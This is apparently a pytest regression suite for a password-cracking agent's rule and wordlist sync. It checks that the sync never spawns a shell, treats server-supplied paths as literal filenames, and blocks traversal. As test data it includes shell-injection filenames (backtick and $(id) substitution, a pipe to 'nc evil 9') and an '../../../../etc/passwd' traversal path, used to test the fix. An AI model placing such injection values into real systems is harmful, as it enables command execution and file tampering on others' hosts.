"""The agent's rule/wordlist sync must not shell out (issue #297 follow-up).

``sync_rules`` used to decompress and install downloaded rule files with
``run_command(f'gunzip {tmp_gz}')`` and ``run_command(f'mv {tmp_file} {dest}')``,
where ``run_command`` is ``subprocess.Popen(..., shell=True)`` and ``dest`` is built
from the SERVER-supplied ``Rules.path`` basename. Any shell metacharacter in that
path executed on the agent host as the agent's user. Post-#337 servers randomize
the stored path, but an install upgraded from before #337 still carries
attacker-influenced rows, and reachability isn't a boundary — so the fix is the
mechanism: decompress with ``gzip`` in-process, install with ``os.replace``, and
sanitize the server-supplied filename before it becomes a path.

These tests pin all three: no ``subprocess`` use anywhere in the sync, the payload
lands as a literal filename inside ``control/rules``, and a filename that isn't a
plain basename is refused rather than written.
"""
import ast
import gzip
import importlib.util
import os
import sys
import types
from pathlib import Path
from unittest import mock

import pytest

AGENT_ROOT = Path(__file__).resolve().parents[2] / "install" / "hashview-agent"


def _load_agent_main():
    if "psutil" not in sys.modules:
        stub = types.ModuleType("psutil")

        class _PsutilError(Exception):
            pass

        stub.Error = _PsutilError
        stub.NoSuchProcess = type("NoSuchProcess", (_PsutilError,), {})
        stub.AccessDenied = type("AccessDenied", (_PsutilError,), {})
        stub.ZombieProcess = type("ZombieProcess", (_PsutilError,), {})
        stub.process_iter = lambda *a, **k: []
        sys.modules["psutil"] = stub

    real_exists = os.path.exists
    path = AGENT_ROOT / "hashview-agent.py"
    with mock.patch.object(sys, "argv", ["hashview-agent.py"]), \
         mock.patch(
             "os.path.exists",
             side_effect=lambda p: True if str(p).endswith("agent/config.conf") else real_exists(p),
         ):
        spec = importlib.util.spec_from_file_location("hashview_agent_main_rules_sync", path)
        mod = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(mod)
    return mod


agent_main = _load_agent_main()

RULE_BODY = b":\nu\nl\n"   # a tiny, valid best64-ish rule file


def _sha256(data):
    import hashlib
    return hashlib.sha256(data).hexdigest()


@pytest.fixture()
def agent_cwd(tmp_path, monkeypatch):
    """A throwaway agent working tree with fresh, empty manifests."""
    monkeypatch.chdir(tmp_path)
    (tmp_path / "control" / "rules").mkdir(parents=True)
    (tmp_path / "control" / "tmp").mkdir(parents=True)
    monkeypatch.setattr(agent_main, "rules_manifest",
                        agent_main.Manifest(str(tmp_path / "control" / "rules_manifest.json")))
    return tmp_path


@pytest.fixture()
def no_shell(monkeypatch):
    """Any attempt to spawn a process during the sync is a hard failure."""
    def forbidden(*args, **kwargs):
        raise AssertionError(f"sync_rules spawned a process: {args!r} {kwargs!r}")

    monkeypatch.setattr(agent_main.subprocess, "Popen", forbidden)
    monkeypatch.setattr(agent_main.os, "system", forbidden, raising=False)
    return forbidden


def _serve_one_rule(monkeypatch, path, body=RULE_BODY, checksum=None):
    """Stub the server side: one rule entry whose file is the gzip of `body`."""
    entry = {"id": 7, "path": path, "checksum": checksum or _sha256(body)}
    monkeypatch.setattr(agent_main.api, "rules_list", lambda: [entry])
    monkeypatch.setattr(agent_main.api, "get_rules_file",
                        lambda rule_id: gzip.compress(body))
    return entry


def test_rules_sync_installs_without_spawning_a_shell(agent_cwd, no_shell, monkeypatch):
    """The happy path decompresses and installs in-process."""
    _serve_one_rule(monkeypatch, "control/rules/deadbeefcafe1234")

    agent_main.sync_rules()

    installed = agent_cwd / "control" / "rules" / "deadbeefcafe1234"
    assert installed.read_bytes() == RULE_BODY
    assert agent_main.rules_manifest.data["7"]["filename"] == "deadbeefcafe1234"
    # the temp download is cleaned up, not left in control/tmp
    assert list((agent_cwd / "control" / "tmp").iterdir()) == []


def test_rules_sync_treats_shell_metacharacters_as_a_literal_filename(agent_cwd, no_shell,
                                                                      monkeypatch):
    """A rule path carrying shell metacharacters must never be interpreted.

    Pre-#337 rows can hold an attacker-influenced path; the old `mv` f-string ran
    it. With no shell involved the payload is just an (ugly) literal filename.
    """
    payload = "evil; touch pwned #`id`$(id)|nc evil 9"
    _serve_one_rule(monkeypatch, f"control/rules/{payload}")

    agent_main.sync_rules()

    rules_dir = agent_cwd / "control" / "rules"
    assert (rules_dir / payload).read_bytes() == RULE_BODY   # one literal file
    # No side effect of the payload having been interpreted anywhere.
    assert not (agent_cwd / "pwned").exists()
    assert not (rules_dir / "pwned").exists()


@pytest.mark.parametrize("path", [
    "control/rules/..",            # basename that is a directory reference
    "control/rules/.",
    "control/rules/",              # empty basename
    "..",
])
def test_rules_sync_refuses_a_filename_that_is_not_a_plain_basename(agent_cwd, no_shell,
                                                                    monkeypatch, path):
    """Anything that doesn't reduce to a real filename is dropped, not written."""
    _serve_one_rule(monkeypatch, path)

    agent_main.sync_rules()

    assert agent_main.rules_manifest.data == {}
    assert list((agent_cwd / "control" / "rules").iterdir()) == []
    assert list((agent_cwd / "control" / "tmp").iterdir()) == []


def test_rules_sync_collapses_a_traversal_path_to_its_basename(agent_cwd, no_shell, monkeypatch):
    """`../../../../etc/passwd` may only ever land inside control/rules."""
    _serve_one_rule(monkeypatch, "../../../../etc/passwd")

    agent_main.sync_rules()

    assert (agent_cwd / "control" / "rules" / "passwd").read_bytes() == RULE_BODY
    assert agent_main.rules_manifest.data["7"]["filename"] == "passwd"


def test_rules_sync_discards_a_checksum_mismatch(agent_cwd, no_shell, monkeypatch):
    """A rule whose decompressed content doesn't match the server checksum is
    dropped — nothing installed, nothing left in control/tmp."""
    _serve_one_rule(monkeypatch, "control/rules/abc123", checksum="0" * 64)

    agent_main.sync_rules()

    assert agent_main.rules_manifest.data == {}
    assert list((agent_cwd / "control" / "rules").iterdir()) == []
    assert list((agent_cwd / "control" / "tmp").iterdir()) == []


def test_rules_sync_survives_a_corrupt_gzip_download(agent_cwd, no_shell, monkeypatch):
    """Not-gzip bytes used to make `gunzip` fail and (via run_command) SIGINT the
    whole agent. In-process decompression must just skip that rule."""
    monkeypatch.setattr(agent_main.api, "rules_list",
                        lambda: [{"id": 7, "path": "control/rules/abc123",
                                  "checksum": _sha256(RULE_BODY)}])
    monkeypatch.setattr(agent_main.api, "get_rules_file", lambda rule_id: b"not gzip at all")

    agent_main.sync_rules()   # must not raise or kill the process

    assert agent_main.rules_manifest.data == {}
    assert list((agent_cwd / "control" / "tmp").iterdir()) == []


def test_shell_run_command_helper_is_gone(agent_cwd):
    """`run_command` was the only shell=True sink left in the agent; the crack path
    uses run_hashcat(argv, ...) with shell=False. Nothing should re-add it."""
    assert not hasattr(agent_main, "run_command"), (
        "run_command (the subprocess shell sink) is back in the agent"
    )
    # No call anywhere in the script may pass a truthy `shell` keyword. Checked via
    # the AST rather than a substring so prose about the old behaviour is fine.
    tree = ast.parse((AGENT_ROOT / "hashview-agent.py").read_text())
    shell_calls = [
        ast.dump(node) for node in ast.walk(tree)
        if isinstance(node, ast.Call)
        for kw in node.keywords
        if kw.arg == "shell" and not (isinstance(kw.value, ast.Constant) and not kw.value.value)
    ]
    assert shell_calls == [], f"agent spawns a process through a shell: {shell_calls!r}"


def test_rules_sync_re_downloads_a_changed_rule_in_process(agent_cwd, no_shell, monkeypatch):
    """The changed-checksum branch (an existing manifest entry) takes the same
    shell-free path as a new download and replaces the old file."""
    stale = agent_cwd / "control" / "rules" / "oldname"
    stale.write_bytes(b"stale\n")
    agent_main.rules_manifest.data = {"7": {"checksum": "0" * 64, "filename": "oldname"}}
    _serve_one_rule(monkeypatch, "control/rules/newname")

    agent_main.sync_rules()

    assert (agent_cwd / "control" / "rules" / "newname").read_bytes() == RULE_BODY
    assert not stale.exists()            # replaced, and pruned as an orphan
    assert agent_main.rules_manifest.data["7"]["filename"] == "newname"


# --------------------------------------------------------------------------- #
# The wordlist sync consumes the same untrusted server `path` field.           #
# --------------------------------------------------------------------------- #


@pytest.fixture()
def wordlist_cwd(agent_cwd, monkeypatch):
    (agent_cwd / "control" / "wordlists").mkdir()
    monkeypatch.setattr(agent_main, "wordlists_manifest",
                        agent_main.Manifest(str(agent_cwd / "control" / "wordlists_manifest.json")))
    return agent_cwd


def _serve_one_wordlist(monkeypatch, path, body=RULE_BODY):
    payload = gzip.compress(body)
    entry = {"id": 9, "path": path, "type": "static", "checksum": _sha256(payload)}
    monkeypatch.setattr(agent_main.api, "getWordlists", lambda: [entry])
    monkeypatch.setattr(agent_main.api, "get_wordlists_file", lambda wl_id: payload)
    return entry


def test_wordlist_sync_keeps_a_metacharacter_path_inside_control(wordlist_cwd, no_shell,
                                                                 monkeypatch):
    payload = "evil; touch pwned #`id`"
    _serve_one_wordlist(monkeypatch, f"control/wordlists/{payload}")

    agent_main.sync_wordlists()

    wl_dir = wordlist_cwd / "control" / "wordlists"
    assert (wl_dir / f"{payload}.gz").exists()     # literal name, _gz_name applied
    assert not (wordlist_cwd / "pwned").exists()


@pytest.mark.parametrize("path", ["control/wordlists/..", "control/wordlists/", ".."])
def test_wordlist_sync_refuses_a_filename_that_is_not_a_plain_basename(wordlist_cwd, no_shell,
                                                                       monkeypatch, path):
    _serve_one_wordlist(monkeypatch, path)

    agent_main.sync_wordlists()

    assert agent_main.wordlists_manifest.data == {}
    assert list((wordlist_cwd / "control" / "wordlists").iterdir()) == []
    assert list((wordlist_cwd / "control" / "tmp").iterdir()) == []
